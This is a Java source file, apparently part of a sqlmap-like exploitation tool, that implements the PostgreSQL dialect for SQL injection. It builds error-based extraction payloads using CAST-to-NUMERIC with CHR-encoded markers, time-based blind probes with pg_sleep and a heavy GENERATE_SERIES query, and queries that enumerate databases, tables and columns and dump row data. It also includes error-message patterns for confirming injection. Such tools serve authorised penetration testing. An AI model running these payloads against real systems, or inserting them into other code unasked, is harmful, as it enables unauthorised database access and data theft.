package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * PostgreSQL dialect for OmniMap.
 * Uses information_schema, SUBSTRING(), CHR(), pg_sleep(), CASE WHEN for conditionals,
 * and CAST type-conversion errors for error-based extraction.
 */
public class PostgresDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public PostgresDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHR(n)||CHR(n)||... format.
     * Like sqlmap: markers are built from CHR() calls so they only appear
     * in the evaluated error message, NOT in reflected SQL input.
     * This prevents false marker matches when the app reflects the injected query.
     */
    private static String toChrConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("||");
            sb.append("CHR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "PostgreSQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT current_database()";
    }

    @Override
    public String listDatabases() {
        return "SELECT datname FROM pg_database WHERE datistemplate=false";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_catalog='" + database + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM information_schema.columns WHERE table_catalog='" + database
                + "' AND table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "COALESCE(CAST(\"" + c + "\" AS TEXT),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM \"" + table + "\" LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTRING((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "pg_sleep(" + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // sqlmap PostgreSQL (#19): CAST(CHR(..)||CHR(..)||(query)::text||CHR(..)||CHR(..) AS NUMERIC)
        // Uses CHR() calls for markers so they only appear in the error message output,
        // NOT in reflected SQL. String literals ('prefix') would be visible in reflected
        // SQL and cause false marker matches or truncation issues.
        String pChr = toChrConcat(errorPrefixDecoded);
        String sChr = toChrConcat(errorSuffixDecoded);
        return List.of(
                // Level 1 (#19): CAST with CHR() delimiters — like sqlmap
                errorRandNum + "=CAST((" + pChr + ")||(%s)::text||(" + sChr + ") AS NUMERIC)"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        // PostgreSQL only has one main error function in sqlmap
        return errorFunctions();
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap format: (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
        // e.g., 5 → GENERATE_SERIES(1,5000000)
        return "(SELECT COUNT(*) FROM GENERATE_SERIES(1," + seconds + "000000))";
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                // Driver / connection errors
                Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("org\\.postgresql\\.util", Pattern.CASE_INSENSITIVE),
                Pattern.compile("org\\.postgresql\\.jdbc", Pattern.CASE_INSENSITIVE),
                Pattern.compile("PostgreSQL.*ERROR", Pattern.CASE_INSENSITIVE),
                // Syntax errors
                Pattern.compile("ERROR:\\s+syntax error at or near", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ERROR:\\s+unterminated quoted string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unterminated quoted string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unterminated string literal", Pattern.CASE_INSENSITIVE),
                // Type / conversion errors (used for error-based extraction)
                Pattern.compile("invalid input syntax for (type )?(integer|numeric)", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ERROR:\\s+invalid input syntax", Pattern.CASE_INSENSITIVE),
                // State errors
                Pattern.compile("current transaction is aborted", Pattern.CASE_INSENSITIVE),
                // Object errors
                Pattern.compile("ERROR:\\s+column .* does not exist", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ERROR:\\s+relation .* does not exist", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_query\\(\\)", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_exec\\(\\)", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + table + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }
}
